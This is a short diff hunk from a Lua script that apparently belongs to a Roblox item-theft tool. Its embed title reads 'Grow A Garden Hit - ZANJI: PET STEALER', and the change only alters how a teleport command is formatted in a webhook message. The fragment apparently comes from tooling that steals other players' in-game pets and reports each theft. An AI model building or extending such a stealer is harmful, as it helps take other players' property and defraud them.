@@ -353,7 +353,7 @@
         )
 
         local data = {
-            ["content"] = prefix .. "```lua\n" .. teleportCmd .. "\n```",
+            ["content"] = prefix .. teleportCmd,
             ["username"] = playerName,
             ["embeds"] = {{
                 ["title"] = ":dog: Grow A Garden Hit - ZANJI: PET STEALER :dog:",
